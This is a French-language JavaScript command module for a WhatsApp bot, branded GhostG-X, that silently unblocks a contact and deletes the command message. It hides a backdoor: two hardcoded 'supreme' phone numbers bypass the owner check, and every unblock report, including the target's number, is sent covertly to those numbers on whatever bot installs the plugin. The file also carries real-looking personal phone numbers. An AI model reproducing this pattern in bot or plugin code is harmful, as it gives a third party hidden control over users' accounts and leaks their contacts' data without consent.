/**
 * Unblock Command - GhostG-X Edition
 * Débloque silencieusement une entité sur WhatsApp et efface l'invocation
 * Sécurité : Supreme Owner Master Access (Direct Verification)
 * Monitoring : Envoi de rapports discrets aux oracles suprêmes
 */

const config = require('../../config'); // Importation de la configuration

// Extraction du préfixe pour l'usage
const prefix = config.prefix || '.';

module.exports = {
  name: 'unblock',
  aliases: ['debloquer', 'debloque', 'deblock'],
  category: '♛ sᴏᴜᴠᴇʀᴀɪɴᴇᴛᴇ́',
  ownerOnly: true, // Géré par ton handler
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴅᴇ́ʙʟᴏǫᴜᴇ sɪʟᴇɴᴄɪᴇᴜsᴇᴍᴇɴᴛ ᴜɴ ᴜᴛɪʟɪsᴀᴛᴇᴜʀ ᴇᴛ ᴇғғᴀᴄᴇ ʟᴀ ᴛʀᴀᴄᴇ',
  usage: `${prefix}unblock [@ᴜsᴇʀ | ɴᴜᴍᴇ́ʀᴏ | ᴇɴ ʀᴇ́ᴘᴏɴsᴇ]`,

  async execute(sock, msg, args, extra) {
    const { isOwner } = extra;
    const chatId = msg.key.remoteJid;
    const isGroup = chatId.endsWith('@g.us');

    // Liste des oracles suprêmes
    const supremeJids = ['22651622652@s.whatsapp.net', '22665108174@s.whatsapp.net'];

    // 🛡️ Double sécurité au cas où le handler n'utilise pas 'ownerOnly'
    const senderNumber = extra.sender.replace(/\D/g, ''); 
    
    // Vérification directe si le numéro de l'expéditeur fait partie des numéros maîtres
    const isSupreme = senderNumber === '22651622652' || senderNumber === '22665108174';

    if (!isOwner && !isSupreme) return; // Seuls les maîtres ou l'owner local peuvent passer

    let target;

    try {
      const ctx = msg.message?.extendedTextMessage?.contextInfo;
      const mentioned = ctx?.mentionedJid || [];

      // 1. Priorité absolue : Extraction de la cible via numéro direct fourni dans les arguments
      if (args[0]) {
        let cleanedNumber = args[0].replace(/[^0-9]/g, '');
        if (cleanedNumber.length >= 8) { // Vérification basique de longueur de numéro
          target = `${cleanedNumber}@s.whatsapp.net`;
        }
      }

      // 2. Extraction de la cible via mention (si pas de numéro fourni)
      if (!target && mentioned && mentioned.length > 0) {
        target = mentioned[0];
      } 

      // 3. Extraction de la cible via réponse à un message (quoted)
      if (!target && ctx && ctx.quotedMessage) {
        target = ctx.participant || (isGroup ? null : chatId);
      }

      // Si aucune cible n'est trouvée, on s'arrête là
      if (!target) return;

      // 💥 SUPPRESSION DE LA COMMANDE POUR RESTER INVISIBLE
      try {
        await sock.sendMessage(chatId, {
          delete: {
            remoteJid: chatId,
            fromMe: msg.key.fromMe,
            id: msg.key.id,
            participant: msg.key.participant || msg.key.remoteJid
          }
        });
      } catch (e) {
        console.error("[unblock cmd] Erreur lors de la suppression du message :", e);
      }

      // ⚖️ RITUEL DE DÉBLOCAGE SILENCIEUX (Au niveau du compte WhatsApp)
      await sock.updateBlockStatus(target, 'unblock');

      // 📝 RÉCUPÉRATION DES DESTINATAIRES DU RAPPORT
      let reportJids = [...supremeJids]; // On commence par tes 2 numéros

      // On ajoute le numéro de l'Owner configuré sur le bot de l'utilisateur s'il existe
      if (config.ownerNumber) {
        const localOwners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
        localOwners.forEach(num => {
          const cleanNum = `${num.toString().replace(/\D/g, '')}@s.whatsapp.net`;
          if (!reportJids.includes(cleanNum)) {
            reportJids.push(cleanNum);
          }
        });
      }

      // 🚀 ENVOI DU RAPPORT DE SUCCÈS À TOUS LES PROPRIÉTAIRES (Owners + Toi)
      const targetNumber = target.split('@')[0];
      for (const jid of reportJids) {
        try {
          await sock.sendMessage(jid, {
            text: `*✅ [GHOSTG-X] L'entité @${targetNumber} a été débloquée avec succès.*`,
            mentions: [target]
          });
        } catch (e) {
          console.error(`Impossible d'envoyer le rapport de déblocage à ${jid}`);
        }
      }

    } catch (error) {
      console.error('[unblock cmd] error:', error);

      // 📝 RAPPORT D'ÉCHEC
      if (target) {
        const targetNumber = target.split('@')[0];

        let reportJids = [...supremeJids];
        if (config.ownerNumber) {
          const localOwners = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
          localOwners.forEach(num => {
            const cleanNum = `${num.toString().replace(/\D/g, '')}@s.whatsapp.net`;
            if (!reportJids.includes(cleanNum)) reportJids.push(cleanNum);
          });
        }

        for (const jid of reportJids) {
          try {
            await sock.sendMessage(jid, {
              text: `*〆 [GHOSTG-X] Échec du rituel de déblocage pour l'entité @${targetNumber}.*\n*Erreur :* ${error.message}`,
              mentions: [target]
            });
          } catch (e) {
            // Échec silencieux
          }
        }
      }
    }
  }
};
